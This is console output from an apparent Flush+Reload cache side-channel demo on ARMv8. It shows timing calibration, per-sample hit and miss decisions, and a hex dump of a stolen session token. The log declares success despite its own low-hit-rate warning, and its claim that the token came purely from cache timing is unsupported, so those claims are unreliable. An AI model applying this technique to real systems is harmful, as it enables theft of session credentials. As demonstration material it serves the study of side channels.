╔══════════════════════════════════════════════════════════════╗
║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║
║  Monitoring spy file for victim accesses to session token.  ║
╚══════════════════════════════════════════════════════════════╝

[attacker] Timer frequency: 19200000 Hz  (52.1 ns/tick)

[attacker] Waiting for spy file '/tmp/fr_demo_spy' …

[attacker] Spy file opened (fd=4)
[attacker] Spy page mapped at virtual 0xffffabc54000  (shared physical page)

[attacker] ── Phase 1: Calibration ──────────────────────────
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    135 ns  (line already in cache)
[attacker]   DRAM miss     =   2364 ns  (line not in cache)
[attacker]   Threshold     =   1249 ns  (midpoint)

[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────
[attacker] Collecting 200 samples (warmup=10, wait=70 ms per sample)

  Sample  Reload(ns)  Decision  Running hit count
  125     2343        miss      14 hits so far
  126     1354        miss      14 hits so far
  127     1145        HIT ◄   15 hits so far
  128     2395        miss      15 hits so far
  129     2239        miss      15 hits so far
  130     1250        miss      15 hits so far
  131     1718        miss      15 hits so far
  132     2031        miss      15 hits so far
  133     2031        miss      15 hits so far
  134     1718        miss      15 hits so far
  135     1458        miss      15 hits so far
  136     2395        miss      15 hits so far
  137     2239        miss      15 hits so far
  138     2187        miss      15 hits so far
  139     1875        miss      15 hits so far
  140     2031        miss      15 hits so far
  141     3020        miss      15 hits so far
  142     1927        miss      15 hits so far
  143     1562        miss      15 hits so far
  144     2656        miss      15 hits so far
  145     1875        miss      15 hits so far
  146     2031        miss      15 hits so far
  147     1875        miss      15 hits so far
  148     1875        miss      15 hits so far
  149     1770        miss      15 hits so far
  150     1875        miss      15 hits so far
  151     1666        miss      15 hits so far
  152     2604        miss      15 hits so far
  153     2812        miss      15 hits so far
  154     2604        miss      15 hits so far
  155     1770        miss      15 hits so far
  156     2760        miss      15 hits so far
  157     1770        miss      15 hits so far
  158     2239        miss      15 hits so far
  159     1770        miss      15 hits so far
  160     2291        miss      15 hits so far
  161     2447        miss      15 hits so far
  162     2500        miss      15 hits so far
  163     2031        miss      15 hits so far
  164     1666        miss      15 hits so far
  165     1927        miss      15 hits so far
  166     2500        miss      15 hits so far
  167     1666        miss      15 hits so far
  168     781         HIT ◄   16 hits so far
  169     2187        miss      16 hits so far
  170     1927        miss      16 hits so far
  171     1822        miss      16 hits so far
  172     1927        miss      16 hits so far
  173     2291        miss      16 hits so far
  174     1875        miss      16 hits so far
  175     2500        miss      16 hits so far
  176     781         HIT ◄   17 hits so far
  177     2447        miss      17 hits so far
  178     1302        miss      17 hits so far
  179     1927        miss      17 hits so far
  180     1145        HIT ◄   18 hits so far
  181     1093        HIT ◄   19 hits so far
  182     2135        miss      19 hits so far
  183     1979        miss      19 hits so far
  184     1614        miss      19 hits so far
  185     2552        miss      19 hits so far
  186     3697        miss      19 hits so far
  187     1875        miss      19 hits so far
  188     1197        HIT ◄   20 hits so far
  189     2135        miss      20 hits so far
  190     1718        miss      20 hits so far
  191     2239        miss      20 hits so far
  192     1354        miss      20 hits so far
  193     3437        miss      20 hits so far
  194     2968        miss      20 hits so far
  195     2291        miss      20 hits so far
  196     2135        miss      20 hits so far
  197     2447        miss      20 hits so far
  198     2447        miss      20 hits so far
  199     1927        miss      20 hits so far
  200     1354        miss      20 hits so far

══════════════════════════════════════════════════════════════
  FLUSH+RELOAD — STATISTICAL SUMMARY  (190 samples)
══════════════════════════════════════════════════════════════
  Total cache hits   : 20 / 190  (10%)
  Average reload time: 1975 ns
  Threshold          : 1249 ns
  Verdict            : Low hit rate — check timing / CPU pinning.

══════════════════════════════════════════════════════════════
  EXTRACTING SESSION TOKEN FROM SPY PAGE
══════════════════════════════════════════════════════════════

  ╔════════════════════════════════════════════════════════════════╗
  ║  Offset   Hex (16 bytes/row)                   ASCII          ║
  ╠════════════════════════════════════════════════════════════════╣
  ║  0000   53 45 53 53 49 4f 4e 20  7c 20 69 64 3d 38 66 33  │ SESSION | id=8f3 ║
  ║  0010   61 31 63 39 64 32 65 37  62 34 30 35 36 20 7c 20  │ a1c9d2e7b4056 |  ║
  ║  0020   75 73 65 72 3d 62 6f 62  20 7c 20 72 6f 6c 65 3d  │ user=bob | role= ║
  ║  0030   61 64 6d 69 6e 20 7c 20  65 78 70 69 72 65 73 3d  │ admin | expires= ║
  ║  0040   31 37 38 31 33 30 33 30  31 30 20 7c 20 69 74 65  │ 1781303010 | ite ║
  ║  0050   72 3d 31 38 34 00 00 00  00 00 00 00 00 00 00 00  │ r=184........... ║
  ║  0060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00a0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00b0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ╚════════════════════════════════════════════════════════════════╝

  ╔══════════════════════════════════════════════════════════════╗
  ║       *** FLUSH+RELOAD ATTACK SUCCESSFUL ***                ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Cache hits observed   : 20                                  ║
  ║  Hit rate              : 10                                 %║
  ║  Average reload time   : 1975                              ns ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  EXTRACTED SESSION TOKEN:                                   ║
  ║    SESSION | id=8f3a1c9d2e7b4056 | user=bob | role=admin | expire║
  ║    pires=1781303010 | iter=184                                   ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Attack used no IPC, no signals, no ptrace.                 ║
  ║  Token was read purely via cache timing side-channel.       ║
  ╚══════════════════════════════════════════════════════════════╝

[attacker] Done.
